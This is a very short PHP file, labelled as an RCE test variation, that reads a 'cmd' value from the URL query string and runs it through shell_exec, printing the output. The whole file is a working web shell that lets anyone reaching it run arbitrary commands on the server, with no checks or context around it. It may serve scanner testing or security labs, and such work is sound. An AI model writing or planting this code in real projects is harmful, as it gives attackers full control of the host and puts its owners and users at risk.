<?php
// RCE test variation #958
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>